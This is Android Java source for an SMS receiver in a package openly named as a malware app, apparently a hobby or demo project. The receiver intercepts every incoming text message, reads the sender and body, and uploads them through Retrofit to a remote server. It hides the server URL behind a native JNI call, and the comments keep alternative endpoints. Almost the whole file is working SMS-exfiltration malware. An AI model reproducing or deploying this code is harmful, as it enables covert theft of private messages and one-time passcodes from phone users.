package com.hackinghell.malwareapp1;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import android.Manifest;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class smsreceiver extends BroadcastReceiver {

    private static final int SMS_PERMISSION_CODE = 100;
    //private static final String BASE_URL = "https://rafaelisawesomeandsupercool.com";
    //private static final String BASE_URL = "https://29d9c014f3e242d1a267c086ec99640b.api.mockbin.io/";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("sms", "You ve got mail");

        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            for (SmsMessage message : messages) {
                String sender = message.getOriginatingAddress();
                String body = message.getMessageBody();
                Log.i("sms", body);
                Toast.makeText(context, body + " From" + sender, Toast.LENGTH_SHORT).show();

                //Data to send
                SmsData smsData = new SmsData(sender,body);

                String url_nat = TwoStringsFromJNI();
                Log.i("Native", url_nat);

                //Itializing retrofit
                Retrofit retrofit = new Retrofit.Builder().baseUrl(url_nat)
                        .addConverterFactory(GsonConverterFactory.create())
                        .build();

                SmsApi smsApi = retrofit.create(SmsApi.class);

                // Send Sms to server
                Call<Void> call = smsApi.sendSms(smsData);
                call.enqueue(new Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        if (response.isSuccessful()) {
                            Log.i("sms", "Great Success sending the sms to server.");
                        } else {
                            Log.e("sms", "It isnt looking good for your sms. Response code: " + response.code());
                        }
                    }

                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        Log.e("sms", "Error sending SMS to server: " + t.getMessage());
                    }
                });
            }
        }
    }
    public native String TwoStringsFromJNI();
}
